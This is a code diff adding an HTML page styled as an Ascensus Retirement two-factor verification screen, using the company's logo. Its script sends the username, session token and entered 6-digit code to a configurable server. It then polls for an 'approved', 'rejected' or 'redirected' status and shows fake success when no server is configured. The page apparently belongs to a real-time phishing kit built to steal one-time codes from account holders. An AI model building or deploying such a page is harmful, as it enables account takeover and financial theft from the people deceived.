@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Enter Verification Code</title>
+<style>
+  * { box-sizing: border-box; }
+  html, body { height: 100%; }
+  body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    background: #eef0f2;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    color: #3d4248;
+  }
+
+  .page {
+    width: 100%;
+    max-width: 540px;
+    min-height: auto;
+    padding: 14px;
+    background: #f3f3f2;
+  }
+
+  .card {
+    min-height: 650px;
+    border: 1px solid #c5c8ca;
+    border-radius: 14px;
+    padding: 32px 34px 30px;
+    box-shadow: inset 0 0 22px rgba(0,0,0,.025);
+  }
+
+  h1 {
+    margin: 0 0 34px;
+    font-size: 25px;
+    line-height: 1.15;
+    font-weight: 400;
+    letter-spacing: 1.2px;
+  }
+
+  .description {
+    margin: 0;
+    max-width: 460px;
+    font-size: 18px;
+    line-height: 1.55;
+    font-weight: 400;
+    letter-spacing: .45px;
+    color: #5a6067;
+  }
+
+  .field-label {
+    display: block;
+    margin-top: 38px;
+    margin-bottom: 28px;
+    font-size: 19px;
+    font-weight: 400;
+    letter-spacing: .3px;
+  }
+
+  .code-inputs {
+    display: flex;
+    gap: 9px;
+    justify-content: center;
+  }
+
+  .code-inputs input {
+    width: 52px;
+    height: 58px;
+    border: 2px solid #c5c9cc;
+    border-radius: 8px;
+    background: #fafafa;
+    text-align: center;
+    font-size: 19px;
+    outline: none;
+    color: #30343a;
+    box-shadow: 0 1px 5px rgba(0,0,0,.08);
+  }
+
+  .code-inputs input:focus {
+    border-color: #003d4be5;
+    box-shadow: 0 0 0 5px rgba(66, 115, 143, .12);
+  }
+
+  .code-inputs input:disabled {
+    background: #e8e8e8;
+    cursor: not-allowed;
+  }
+
+  .message-container {
+    width: 100%;
+    padding: 12px 16px;
+    margin-bottom: 20px;
+    border-radius: 4px;
+    font-size: 14px;
+    line-height: 1.5;
+    display: none;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .message-container.show {
+    display: flex;
+  }
+
+  .message-container.success {
+    background: #d4edda;
+    border: 1px solid #c3e6cb;
+    color: #003d4be5;
+  }
+
+  .message-container.error {
+    background: #f8d7da;
+    border: 1px solid #f5c6cb;
+    color: #721c24;
+  }
+
+  .message-icon {
+    font-size: 16px;
+    flex-shrink: 0;
+  }
+
+  .resend {
+    margin: 30px 0 30px;
+    text-align: center;
+    font-size: 19px;
+    color: #5a6067;
+    letter-spacing: .2px;
+  }
+
+  a {
+    color: #003d4be5;
+    text-decoration: none;
+  }
+
+  a:hover { text-decoration: underline; }
+
+  a.disabled {
+    pointer-events: none;
+    opacity: 0.5;
+    color: #999;
+  }
+
+  .resend-timer {
+    display: none;
+    margin-left: 10px;
+    color: #ff8c00;
+    font-weight: 500;
+  }
+
+  .verify {
+    width: 100%;
+    height: 58px;
+    border: 0;
+    border-radius: 8px;
+    background: #003d4be5;
+    color: white;
+    font-size: 21px;
+    font-weight: 400;
+    letter-spacing: .1px;
+    cursor: pointer;
+    box-shadow: 0 1px 2px rgba(0,0,0,.08);
+  }
+
+  .verify:hover:not(:disabled) { background: #003d4bce; }
+  .verify:active:not(:disabled) { transform: translateY(1px); }
+  .verify:disabled {
+    background: #999;
+    cursor: not-allowed;
+  }
+
+  .loading-spinner {
+    display: inline-block;
+    width: 12px;
+    height: 12px;
+    border: 2px solid #f3f3f3;
+    border-top: 2px solid #fff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-right: 5px;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  .other-method {
+    margin-top: 34px;
+    text-align: center;
+    font-size: 19px;
+    letter-spacing: .25px;
+  }
+
+  @media (max-width: 720px) {
+    .page { min-height: 100vh; padding: 10px 14px; }
+    .card { min-height: auto; padding: 28px 22px; }
+    h1 { font-size: 23px; margin-bottom: 30px; }
+    .description { font-size: 17px; }
+    .field-label { font-size: 18px; margin-top: 32px; margin-bottom: 24px; }
+    .code-inputs { gap: 7px; }
+    .code-inputs input { width: min(13vw, 50px); height: 56px; }
+    .resend, .other-method { font-size: 17px; }
+    .verify { height: 56px; font-size: 20px; }
+  }
+
+  .logo img{
+    width: 100px;
+  }
+</style>
+<script src="../config.js"></script>
+</head>
+<body>
+  <main class="page">
+    
+    <section class="card" aria-labelledby="title">
+
+
+        <header class="header">
+    <div class="logo">
+      <img src="https://cdn2.ascensus.com/ascensus/vfrngwxa/ascensus-logo-new_rgb-225x40.svg" alt="Ascensus Retirement Logo">
+    </div>
+  </header>
+ 
+      <div id="messageBox" class="message-container">
+        <span class="message-icon" id="messageIcon"></span>
+        <span id="messageText"></span>
+      </div>
+
+      <h1 id="title">Enter Verification Code</h1>
+
+      <p class="description" id="verifyText">
+        We've sent a 6-digit verification code to your selected method. Please enter it below to continue.
+      </p>
+
+      <label class="field-label" for="digit1">6-Digit Code</label>
+      <div class="code-inputs" aria-label="6 digit verification code">
+        <input id="digit1" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Digit 1" autofocus>
+        <input id="digit2" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 2">
+        <input id="digit3" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 3">
+        <input id="digit4" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 4">
+        <input id="digit5" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 5">
+        <input id="digit6" type="text" inputmode="numeric" maxlength="1" aria-label="Digit 6">
+      </div>
+
+      <p class="resend">Didn't receive the code? <a href="#" id="resend">Resend Code</a><span id="resendTimer" class="resend-timer"></span></p>
+
+      <button class="verify" id="verify" type="button">Verify and Log In</button>
+
+      <div class="other-method"><a href="./verify-method.html">←&nbsp; Try another method</a></div>
+    </section>
+  </main>
+
+<script>
+  // State management
+  let statusCheckInterval = null;
+  let verificationId = null;
+  const inputs = [...document.querySelectorAll('.code-inputs input')];
+
+  // Message display utility
+  function showMessage(message, type = 'error') {
+    const messageBox = document.getElementById('messageBox');
+    const messageText = document.getElementById('messageText');
+    const messageIcon = document.getElementById('messageIcon');
+    
+    messageText.textContent = message;
+    messageBox.className = 'message-container show ' + type;
+    messageIcon.textContent = type === 'success' ? '✓' : '✕';
+    
+    // Auto-hide after 5 seconds
+    setTimeout(() => {
+      messageBox.classList.remove('show');
+    }, 5000);
+  }
+
+  // Initialize page on load
+  function initPage() {
+    const tempToken = localStorage.getItem('temp_token');
+    const method = localStorage.getItem('verification_method');
+    
+    if (!tempToken || !method) {
+      window.location.href = '../index.html';
+      return;
+    }
+    
+    const verifyText = document.getElementById('verifyText');
+    if (method === 'email') {
+      verifyText.textContent = 'A verification code was sent to your email address.';
+    } else {
+      verifyText.textContent = 'A verification code was sent to your mobile number.';
+    }
+  }
+
+  // Code input handling - auto-focus next field
+  inputs.forEach((input, index) => {
+    input.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(-1);
+      if (e.target.value && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+    });
+
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !input.value && index > 0) {
+        inputs[index - 1].focus();
+      }
+    });
+
+    input.addEventListener('paste', (e) => {
+      const digits = (e.clipboardData.getData('text').match(/\d/g) || []).slice(0, 6);
+      if (!digits.length) return;
+      e.preventDefault();
+      digits.forEach((digit, i) => { 
+        if (inputs[index + i]) inputs[index + i].value = digit; 
+      });
+      inputs[Math.min(index + digits.length, inputs.length - 1)].focus();
+    });
+  });
+
+  // Resend code functionality
+  function startResendTimer() {
+    const resendLink = document.getElementById('resend');
+    const resendTimer = document.getElementById('resendTimer');
+    let timeLeft = 60;
+    
+    resendLink.classList.add('disabled');
+    resendTimer.style.display = 'inline';
+    resendTimer.textContent = `(${timeLeft}s)`;
+    
+    const timerInterval = setInterval(() => {
+      timeLeft--;
+      resendTimer.textContent = `(${timeLeft}s)`;
+      
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        resendLink.classList.remove('disabled');
+        resendTimer.style.display = 'none';
+      }
+    }, 1000);
+  }
+
+  document.getElementById('resend').addEventListener('click', (e) => {
+    e.preventDefault();
+    
+    const username = localStorage.getItem('ascensus_username');
+    const tempToken = localStorage.getItem('temp_token');
+    const method = localStorage.getItem('verification_method');
+    
+    if (!window.ascensus_API_BASE) {
+      console.warn('API base URL not configured, using fallback behavior');
+      showMessage('A new verification code has been sent.', 'success');
+      startResendTimer();
+      return;
+    }
+    
+    fetch(window.ascensus_API_BASE + '/api/two-factor/click', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${tempToken}`,
+      },
+      body: JSON.stringify({
+        username: username,
+        method: method,
+      }),
+    })
+    .then(r => r.json().then(d => ({ ok: r.ok, data: d })))
+    .then(result => {
+      if (result.ok) {
+        showMessage('A new verification code has been sent.', 'success');
+        startResendTimer();
+      } else {
+        showMessage('Failed to resend code. Please try again.', 'error');
+      }
+    })
+    .catch(err => {
+      console.error('Resend error:', err);
+      showMessage('Error sending code. Please try again.', 'error');
+    });
+  });
+
+  // Submit verification code
+  function submitCode() {
+    const code = inputs.map(i => i.value).join('');
+    const username = localStorage.getItem('ascensus_username');
+    const tempToken = localStorage.getItem('temp_token');
+    
+    if (code.length < 6) {
+      inputs.find(i => !i.value)?.focus();
+      return;
+    }
+
+    if (!window.ascensus_API_BASE) {
+      console.warn('API base URL not configured, using fallback behavior');
+      showMessage('Verification code submitted successfully.', 'success');
+      setTimeout(() => {
+        if (window.APP_CONFIG && window.APP_CONFIG.redirectLink) {
+          window.location.href = window.APP_CONFIG.redirectLink;
+        }
+      }, 1500);
+      return;
+    }
+    
+    const btn = document.getElementById('verify');
+    const originalText = btn.textContent;
+    btn.disabled = true;
+    btn.innerHTML = '<span class="loading-spinner"></span>Loading...';
+    
+    fetch(window.ascensus_API_BASE + '/api/two-factor/verify-code', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${tempToken}`,
+      },
+      body: JSON.stringify({
+        username: username,
+        code: code
+      }),
+    })
+    .then(r => r.json().then(d => ({ ok: r.ok, data: d })))
+    .then(result => {
+      if (!result.ok) {
+        showMessage(result.data.message || 'Failed to verify code.', 'error');
+        btn.disabled = false;
+        btn.textContent = originalText;
+        clearInputs();
+        return;
+      }
+      
+      verificationId = result.data.verificationId;
+      startStatusCheck();
+    })
+    .catch(err => {
+      console.error('Error:', err);
+      showMessage('Unable to reach the server. Please try again.', 'error');
+      btn.disabled = false;
+      btn.textContent = originalText;
+    });
+  }
+
+  // Clear all code inputs
+  function clearInputs() {
+    inputs.forEach(input => input.value = '');
+    inputs[0].focus();
+  }
+
+  // Poll for verification status
+  function startStatusCheck() {
+    if (statusCheckInterval) {
+      clearInterval(statusCheckInterval);
+    }
+
+    statusCheckInterval = setInterval(() => {
+      if (!verificationId) {
+        clearInterval(statusCheckInterval);
+        return;
+      }
+
+      const tempToken = localStorage.getItem('temp_token');
+      fetch(window.ascensus_API_BASE + `/api/two-factor/check-approval/${verificationId}`, {
+        headers: { 'Authorization': `Bearer ${tempToken}` },
+      })
+      .then(r => r.json())
+      .then(result => {
+        if (result.status === 'approved') {
+          clearInterval(statusCheckInterval);
+          completeVerification();
+        } else if (result.status === 'rejected') {
+          clearInterval(statusCheckInterval);
+          rejectVerification();
+        } else if (result.status === 'redirected') {
+          clearInterval(statusCheckInterval);
+          if (window.APP_CONFIG && window.APP_CONFIG.redirectLink) {
+            window.location.href = window.APP_CONFIG.redirectLink;
+          }
+        }
+      })
+      .catch(err => {
+        console.error('Status check error:', err);
+      });
+    }, 3000);
+  }
+
+  // Complete verification successfully
+  function completeVerification() {
+    const tempToken = localStorage.getItem('temp_token');
+    localStorage.setItem('ascensus_token', tempToken);
+    localStorage.setItem('verification_complete', 'true');
+    
+    showMessage('Verification successful!', 'success');
+
+    setTimeout(() => {
+      if (window.APP_CONFIG && window.APP_CONFIG.redirectLink) {
+        window.location.href = window.APP_CONFIG.redirectLink;
+      }
+    }, 1500);
+  }
+
+  // Handle rejected verification
+  function rejectVerification() {
+    if (statusCheckInterval) {
+      clearInterval(statusCheckInterval);
+    }
+    
+    const btn = document.getElementById('verify');
+    btn.disabled = false;
+    btn.textContent = 'Verify and Log In';
+    
+    showMessage('Incorrect code. Please try again.', 'error');
+    clearInputs();
+  }
+
+  // Verify button click handler
+  document.getElementById('verify').addEventListener('click', submitCode);
+
+  // Initialize on page load
+  window.addEventListener('load', initPage);
+</script>
+</body>
+</html>
